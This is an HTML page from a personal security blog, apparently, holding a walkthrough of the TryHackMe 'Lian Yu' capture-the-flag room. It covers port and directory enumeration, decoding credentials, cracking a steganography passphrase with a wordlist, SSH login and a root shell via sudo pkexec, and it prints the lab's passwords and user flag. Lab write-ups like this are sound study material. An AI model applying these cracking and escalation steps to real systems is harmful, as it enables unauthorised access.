@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5&#43;deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T&#43;pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV&#43;d35X8CTUM882eJX&#43;t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k&#43;fnkLzX74fONcAEqseZDOffn5bxS&#43;nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv&#43;hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A&#43;HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg== | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww&#43;oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd&#43;70Rul&#43;G7Ch0uzextmZh7756/VrqKn&#43;rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z&#43;EfuCAfvMe0hxtrbHlb&#43;VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini&#43;VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l&#43;/xEkXPxZ | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2&#43;e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf&#43;QRtxvjnqRg= | 256 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn 80/tcp open http syn-ack Apache httpd |_http-server-header: Apache | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Purgatory 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37365/udp6 status | 100024 1 43176/udp status | 100024 1 43894/tcp status |_ 100024 1 44640/tcp6 status Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/lian-yu/lian-yu/" />
+
+
+    <title>
+        
+            Lian Yu :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Lian Yu">
+<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5&#43;deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T&#43;pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV&#43;d35X8CTUM882eJX&#43;t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k&#43;fnkLzX74fONcAEqseZDOffn5bxS&#43;nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv&#43;hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A&#43;HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg== | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww&#43;oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd&#43;70Rul&#43;G7Ch0uzextmZh7756/VrqKn&#43;rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z&#43;EfuCAfvMe0hxtrbHlb&#43;VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini&#43;VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l&#43;/xEkXPxZ | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2&#43;e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf&#43;QRtxvjnqRg= | 256 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn 80/tcp open http syn-ack Apache httpd |_http-server-header: Apache | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Purgatory 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37365/udp6 status | 100024 1 43176/udp status | 100024 1 43894/tcp status |_ 100024 1 44640/tcp6 status Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="875"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Lian Yu"/>
+<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5&#43;deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T&#43;pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV&#43;d35X8CTUM882eJX&#43;t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k&#43;fnkLzX74fONcAEqseZDOffn5bxS&#43;nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv&#43;hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A&#43;HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg== | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww&#43;oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd&#43;70Rul&#43;G7Ch0uzextmZh7756/VrqKn&#43;rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z&#43;EfuCAfvMe0hxtrbHlb&#43;VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini&#43;VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l&#43;/xEkXPxZ | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2&#43;e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf&#43;QRtxvjnqRg= | 256 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn 80/tcp open http syn-ack Apache httpd |_http-server-header: Apache | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Purgatory 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37365/udp6 status | 100024 1 43176/udp status | 100024 1 43894/tcp status |_ 100024 1 44640/tcp6 status Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."/>
+
+
+
+    <meta property="og:title" content="Lian Yu" />
+<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5&#43;deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T&#43;pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV&#43;d35X8CTUM882eJX&#43;t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k&#43;fnkLzX74fONcAEqseZDOffn5bxS&#43;nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv&#43;hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A&#43;HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg== | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww&#43;oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd&#43;70Rul&#43;G7Ch0uzextmZh7756/VrqKn&#43;rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z&#43;EfuCAfvMe0hxtrbHlb&#43;VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini&#43;VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l&#43;/xEkXPxZ | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2&#43;e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf&#43;QRtxvjnqRg= | 256 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn 80/tcp open http syn-ack Apache httpd |_http-server-header: Apache | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Purgatory 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37365/udp6 status | 100024 1 43176/udp status | 100024 1 43894/tcp status |_ 100024 1 44640/tcp6 status Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/lian-yu/lian-yu/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/lian-yu/lian-yu/">Lian Yu</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT    STATE SERVICE REASON  VERSION
+21/tcp  open  ftp     syn-ack vsftpd 3.0.2
+22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
+|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
+|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
+|   256 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
+80/tcp  open  http    syn-ack Apache httpd
+|_http-server-header: Apache
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Purgatory
+111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          37365/udp6  status
+|   100024  1          43176/udp   status
+|   100024  1          43894/tcp   status
+|_  100024  1          44640/tcp6  status
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8]
+.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8]
+island                  [Status: 301, Size: 235, Words: 14, Lines: 8]
+server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
+
+2100                    [Status: 301, Size: 240, Words: 14, Lines: 8]
+
+green_arrow             [Status: 200, Size: 71, Words: 10, Lines: 7]
+</code></pre><p>Ha! the author is an arrowverse fan. cool!</p>
+<p>Fuzzing with big.txt only got me one directory &ldquo;island&rdquo;</p>
+<p>When I visit it there is a hidden &ldquo;code word&rdquo; in the source code: <code>vigilante</code></p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;style&gt;
+
+&lt;/style&gt;
+&lt;h1&gt; Ohhh Noo, Don&#39;t Talk............... &lt;/h1&gt;
+
+&lt;p&gt; I wasn&#39;t Expecting You at this Moment. I will meet you there &lt;/p&gt;&lt;!-- go!go!go! --&gt;
+
+&lt;p&gt;You should find a way to &lt;b&gt; Lian_Yu&lt;/b&gt; as we are planed. The Code Word is: &lt;/p&gt;&lt;h2 style=&#34;color:white&#34;&gt; vigilante&lt;/style&gt;&lt;/h2&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>where is that directory I was supposed to find first? in numbers?</p>
+<p>I made a quick list of 4 characters numbers to fuzz faster and got <code>2100</code> in island directory</p>
+<p><code>seq 1000 10000 &gt; numbers.txt</code></p>
+<p>We need to find a file now. The fuzzing is strong in here!</p>
+<p>I tried to fuzz for extensions using this</p>
+<p><code>ffuf -w /usr/share/wordlists/dirb/extensions_common.txt:FUZZ  -u http://10.10.56.222/island/2100/indexFUZZ</code></p>
+<p>But only html was accepted, but the file we are looking for is definitelly not html</p>
+<p>Then I read source code again</p>
+<p><code>&lt;!-- you can avail your .ticket here but how?   --&gt;</code></p>
+<p>we got our extension&hellip;lets fuzz!</p>
+<p>found <code>green_arrow.ticket</code></p>
+<pre tabindex="0"><code>This is just a token to get into Queen&#39;s Gambit(Ship)
+
+RTy8yhBQdscX
+</code></pre><p>dont be fooled its not base64 its <code>base58</code></p>
+<p>cyberchef said the password is : <code>!#th3h00d</code></p>
+<p>and we trusted that&hellip;we ftp as vigilante</p>
+<pre tabindex="0"><code>└──╼ $ftp 10.10.56.222                                                                                      
+Connected to 10.10.56.222.
+220 (vsFTPd 3.0.2)
+Name (10.10.56.222:nair0lf32): vigilante
+331 Please specify the password.
+Password:
+230 Login successful.
+</code></pre><p>We take everything (and give nothing back)</p>
+<p>So we got&hellip;files and images</p>
+<p><code>aa.jpg</code></p>
+<!-- raw HTML omitted -->
+<p><code>Queen's_Gambit.png</code></p>
+<!-- raw HTML omitted -->
+<p><code>Leave_me_alone.png</code></p>
+<p>This file got weird metadata and is acting weird</p>
+<p>I will definitelly not leave it alone</p>
+<p>We also got .other_user with a mad long text about <code>slade</code> and the rest is not very useful</p>
+<p>we all know its steganoraphy but wich file?</p>
+<pre tabindex="0"><code>$steghide --info aa.jpg
+&#34;aa.jpg&#34;:
+format: jpeg
+	capacit�: 11,0 KB
+	Essayer d&#39;obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
+	Entrez la passphrase: 
+	
+</code></pre><p>aa.jpg is pretty sus&rsquo; but we got no passphrase</p>
+<p>I googled &ldquo;crack steghide passphrase&rdquo; XD</p>
+<p>found stegCracker a kali tool</p>
+<p><code>sudo pip install stegcracker</code></p>
+<pre tabindex="0"><code>└──╼ $stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2021 - Luke Paris (Paradoxis)
+
+StegCracker has been retired following the release of StegSeek, which 
+will blast through the rockyou.txt wordlist within 1.9 second as opposed 
+to StegCracker which takes ~5 hours.
+
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+
+Counting lines in wordlist..
+Attacking file &#39;aa.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+Successfully cracked file with password: password
+Tried 68 passwords
+Your file has been written to: aa.jpg.out
+password
+</code></pre><p>that was fast and the password was not even guess-able!</p>
+<p>Anyway&hellip;it even already extrated the content for us</p>
+<p>We got <code>passwd.txt</code> wich is full of text&hellip;stuff</p>
+<p>and <code>shado</code> that got our password for ssh</p>
+<p><code>M3tahuman</code></p>
+<p>For the username I went with <code>slade</code> as its the only one we are sure about</p>
+<pre tabindex="0"><code>└──╼ $ssh slade@10.10.160.96
+slade@10.10.160.96&#39;s password: 
+                              Way To SSH...
+                          Loading.........Done.. 
+                   Connecting To Lian_Yu  Happy Hacking
+
+██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
+██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
+██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
+██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
+╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
+ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
+
+
+        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
+        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
+        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
+        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
+        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
+        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #
+</code></pre><p>I love ascii art so I needed to share it</p>
+<p>But I love flags more and I got one right in this folder</p>
+<pre tabindex="0"><code>slade@LianYu:~$ cat user.txt
+THM{Dc_comics_fans_got_arrow}
+                        --Felicity Smoak
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<pre tabindex="0"><code>slade@LianYu:~$ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+</code></pre><p>This one is famous lol and very straightforward</p>
+<p>pkexec litterally execute commands so just tell him to spawn a shell</p>
+<p>As we do it as root its a root shell</p>
+<pre tabindex="0"><code>slade@LianYu:~$ sudo pkexec /bin/bash
+root@LianYu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Touché!</p>
